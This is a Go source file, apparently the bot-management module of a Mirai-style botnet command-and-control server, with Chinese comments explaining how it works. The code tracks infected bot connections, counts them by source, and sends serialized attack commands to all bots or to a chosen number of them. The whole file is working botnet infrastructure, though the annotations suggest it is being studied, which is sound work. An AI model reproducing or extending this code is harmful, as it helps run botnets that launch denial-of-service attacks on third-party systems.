package main

import (
	"fmt"
	"math/rand"
	"sync"
	"time"
)

//管理感染的bot节点

type AttackSend struct {
	buf     []byte
	count   int
	botCata string
}

type ClientList struct {
	uid     int
	count   int          //记录收纳的bot总数
	clients map[int]*Bot //记录这个ClientList管理的所有Bot【bot_id:Bot结构体（其中有这个bot的连接socket等信息）】
	//注意这里都是channel【并且比如addQueue是可以以Bot为单位接收信息的】
	addQueue    chan *Bot
	delQueue    chan *Bot
	atkQueue    chan *AttackSend
	totalCount  chan int
	cntView     chan int
	distViewReq chan int
	distViewRes chan map[string]int
	cntMutex    *sync.Mutex
}

//新建clientList结构体以及两个协程【协程之间使用channel通信】
func NewClientList() *ClientList {
	c := &ClientList{0, 0, make(map[int]*Bot), make(chan *Bot, 128), make(chan *Bot, 128), make(chan *AttackSend), make(chan int, 64), make(chan int), make(chan int), make(chan map[string]int), &sync.Mutex{}}
	go c.worker()          //触发ClientList的工作状态，处理每一个chan的信息【管理用户的请求，比如增加bot、减少bot、发起攻击、查询bot等】
	go c.fastCountWorker() //处理维护bot的计数信息数据。
	return c
}

func (this *ClientList) Count() int {
	this.cntMutex.Lock()
	defer this.cntMutex.Unlock()

	this.cntView <- 0
	return <-this.cntView
}

func (this *ClientList) Distribution() map[string]int {
	this.cntMutex.Lock()
	defer this.cntMutex.Unlock()
	this.distViewReq <- 0
	return <-this.distViewRes
}

func (this *ClientList) AddClient(c *Bot) {
	this.addQueue <- c
}

func (this *ClientList) DelClient(c *Bot) {
	this.delQueue <- c
	fmt.Printf("Deleted client %d - %s - %s\n", c.version, c.source, c.conn.RemoteAddr())
}

//这是基于一整个ClientList发起攻击，在worker解析atkQueue管道的新数据的时候，才会分派给Bot.QueueBuf，基于conn（socket）下发给多个bots
func (this *ClientList) QueueBuf(buf []byte, maxbots int, botCata string) {
	attack := &AttackSend{buf, maxbots, botCata}
	this.atkQueue <- attack
}

func (this *ClientList) fastCountWorker() {
	for {
		select {
		case delta := <-this.totalCount: //如果出现统计计数变化，
			this.count += delta //修改ClientList管理的bot计数情况
			break
		case <-this.cntView: //查看bot的数量
			this.cntView <- this.count
			break
		}
	}
}

//https://draveness.me/golang/docs/part2-foundation/ch05-keyword/golang-select/
//在通常情况下，select 语句会阻塞当前 Goroutine 并等待多个 Channel 中的一个达到可以收发的状态。
//但是如果 select 控制结构中包含 default 语句，那么这个 select 语句在执行时会遇到以下两种情况：
//1.当存在可以收发的 Channel 时，直接处理该 Channel 对应的 case；
//2.当不存在可以收发的 Channel 时，执行 default 中的语句；
//其他特点：
//select 能在 Channel 上进行非阻塞的收发操作；
//select 在遇到多个 Channel 同时响应时，会随机执行一种情况；
func (this *ClientList) worker() {
	rand.Seed(time.Now().UTC().UnixNano()) //设置随机数种子

	for {
		select { //select中的case表达式必须都是 Channel的收发操作
		case add := <-this.addQueue: //如果ClientList中被增加了一个Bot，记录为add
			this.totalCount <- 1 //管理的bot计数的变化情况，+1
			this.uid++
			add.uid = this.uid          //标记这个bot的id【uid】
			this.clients[add.uid] = add //增加管理的bot队列
			break
		case del := <-this.delQueue: //如果ClientList中被减少了一个Bot，记录为del
			this.totalCount <- -1         //管理的bot计数的变化情况，-1
			delete(this.clients, del.uid) //删除client中维护的那个bot
			break
		case atk := <-this.atkQueue: //如果攻击队列，增加了攻击请求
			if atk.count == -1 { //atk.count为本次攻击请求的bot个数
				for _, v := range this.clients {
					if atk.botCata == "" || atk.botCata == v.source {
						v.QueueBuf(atk.buf) //atk.buf为攻击命令的序列化表示，下发到bot节点去解析，根据攻击类型要求和配置和攻击目标进行解析，然后触发bot攻击。
					}
				}
			} else {
				var count int
				for _, v := range this.clients { //遍历这个ClientList管理的Bots
					if count > atk.count { //一共使用atk.count个bot发动用户的攻击请求。
						break
					}
					if atk.botCata == "" || atk.botCata == v.source {
						v.QueueBuf(atk.buf) //对每一个bot的connection（socket）发送攻击的序列化指令，发动攻击
						count++
					}
				}
			}
			break
		case <-this.cntView: //查看目前管理了多少bot
			this.cntView <- this.count
			break
		case <-this.distViewReq: //查看bot的分布情况，对bot的来源进行计数?
			res := make(map[string]int)
			for _, v := range this.clients {
				if ok, _ := res[v.source]; ok > 0 {
					res[v.source]++
				} else {
					res[v.source] = 1
				}
			}
			this.distViewRes <- res
		}
	}
}
